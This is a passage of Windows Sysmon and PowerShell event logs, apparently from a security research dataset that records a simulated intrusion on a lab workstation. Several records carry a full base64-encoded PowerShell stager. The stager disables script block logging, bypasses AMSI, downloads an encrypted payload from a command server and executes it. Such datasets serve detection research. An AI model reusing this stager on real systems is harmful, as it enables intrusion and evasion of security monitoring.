QA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                                $taskURI = $script:TaskURIs | Get-Random\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","@timestamp":"2020-09-21T23:35:33.869Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":185101,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"TargetObject":"HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventTypeOrignal":"INFO","EventID":12,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"host":"wec.internal.cloudapp.net","Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","AccountType":"User","ThreadID":4048,"ProcessGuid":"{b34bc01c-2f95-5f69-5f01-000000000900}","EventReceivedTime":"2020-09-21 19:35:34","Opcode":"Info","EventTime":"2020-09-21 19:35:31","@timestamp":"2020-09-21T23:35:34.870Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230287,"Task":12,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":2,"Image":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Category":"Registry object added or deleted (rule: RegistryEvent)","UtcTime":"2020-09-21 23:35:31.870","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:34","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-F6FB-0B856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:35:31","@timestamp":"2020-09-21T23:35:34.871Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":163819,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$5793.Headers.Add($_.Name, $_.Value)\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16273\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:31","EventReceivedTime":"2020-09-21 19:35:34","@timestamp":"2020-09-21T23:35:34.871Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3230288,"SourceProcessId":"908","SourceThreadId":"4484","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-21 23:35:31.886","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:34","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-AB63-0F856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:35:31","@timestamp":"2020-09-21T23:35:34.872Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":163820,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16275\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:31","EventReceivedTime":"2020-09-21 